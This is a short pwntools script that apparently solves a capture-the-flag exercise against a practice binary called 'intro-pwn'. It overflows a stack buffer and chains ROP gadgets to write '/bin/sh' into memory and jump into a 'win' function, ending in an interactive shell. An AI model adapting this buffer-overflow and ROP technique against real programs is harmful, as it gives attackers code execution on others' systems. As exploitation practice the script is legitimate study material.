from pwn import *
exe = context.binary = ELF("./intro-pwn")
r = process()
offset = 24
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.rdi = exe.bss() + 64
rop.raw(exe.plt['gets'])
rop.raw(exe.sym['vuln'])
# sleep(3)
r.sendline(rop.chain())
rop2 = ROP(exe)
rop2.raw(b"A" * offset)
rop2.rdi = exe.bss() + 64
rop2.raw(exe.sym['win'] + 14)
rop2.raw(exe.sym['vuln'])
r.sendline("/bin/sh")
r.sendline(rop2.chain())
r.interactive()